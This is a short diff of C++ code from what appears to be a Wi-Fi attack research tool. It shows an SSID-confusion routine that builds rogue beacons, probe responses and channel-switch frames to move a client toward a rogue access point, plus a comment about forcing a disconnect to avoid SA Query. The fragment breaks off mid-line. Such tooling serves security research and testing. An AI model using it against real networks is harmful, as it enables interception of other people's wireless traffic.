@@ -34,8 +34,9 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     }
     probe_resp = std::make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*confused_beacon, netconfig.rogue_channel));
 
-	csa_frames = CSA_attack::get_CSA_frames(ap.get(SK::mac), netconfig.real_channel, { 6, WifiBand::BAND_2_4, nullopt }, beacon, sta.get(SK::mac), true);
-	Dot11Beacon legacy_beacon = expected_vht_beacon_attack::build_legacy_beacon(*beacon);
+	//FIXME HARDCODED fake rogue_ap to disconnect -> no SA Query
+    csa_frames = CSA_attack::get_CSA_frames(ap.get(SK::mac), netconfig.real_channel, { 6, WifiBand::BAND_2_4, nullopt }, beacon, sta.get(SK::mac), true);
+    Dot11Beacon legacy_beacon = expected_vht_beacon_attack::build_legacy_beacon(*beacon);
 
     // BPF: AP + client traffic only
 	const string bpf = "(wlan type data or mgt) and (wlan host " + ap.get(SK::permanent_mac) + " or wlan host " +
